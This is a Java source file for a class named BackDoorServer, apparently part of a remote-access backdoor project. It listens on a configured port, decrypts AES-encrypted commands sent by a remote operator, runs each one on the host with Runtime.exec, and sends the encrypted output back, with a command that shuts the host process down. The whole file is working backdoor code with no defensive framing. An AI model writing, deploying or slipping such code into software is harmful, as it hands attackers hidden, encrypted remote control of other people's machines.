package com.github.pulsebeat02.backdoor;

import com.github.pulsebeat02.config.NetworkAddress;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.CompletableFuture;

public class BackDoorServer {

  public BackDoorServer() throws Exception {
    start();
  }

  public void start() throws Exception {
    final String endSignal = "%**%";
    final String algorithm = "AES";
    final CryptoHelper cryptoHelper = new CryptoHelper(NetworkAddress.getEncryptionKey(), algorithm);
    final ServerSocket serverSocket = new ServerSocket(NetworkAddress.getPort());
    while (!serverSocket.isClosed()) {
      final Socket socket = serverSocket.accept();
      CompletableFuture.runAsync(
          () -> {
            try (final BufferedReader bufferedReader =
                new BufferedReader(new InputStreamReader(socket.getInputStream()))) {
              try (final PrintWriter printWriter = new PrintWriter(socket.getOutputStream())) {
                while (!socket.isClosed()) {
                  final String cmd = cryptoHelper.decrypt(bufferedReader.readLine());
                  if (cmd.equals("exit")) {
                    break;
                  }
                  if (cmd.equals("exit-server")) {
                    System.exit(0);
                  }
                  try {
                    final Process p = Runtime.getRuntime().exec(cmd);
                    final BufferedReader buf =
                        new BufferedReader(new InputStreamReader(p.getInputStream()));
                    buf.lines()
                        .forEach(
                            s -> {
                              try {
                                printWriter.println(cryptoHelper.encrypt(s));
                                printWriter.flush();
                              } catch (final Exception e) {
                                e.printStackTrace();
                              }
                            });
                  } catch (final Exception e) {
                    e.printStackTrace();
                    printWriter.println(cryptoHelper.encrypt(e.getMessage()));
                    printWriter.flush();
                  }
                  printWriter.println(cryptoHelper.encrypt(endSignal));
                  printWriter.flush();
                }
              } catch (final Exception e) {
                e.printStackTrace();
              }
            } catch (final IOException e) {
              e.printStackTrace();
            }
          });
    }
  }
}
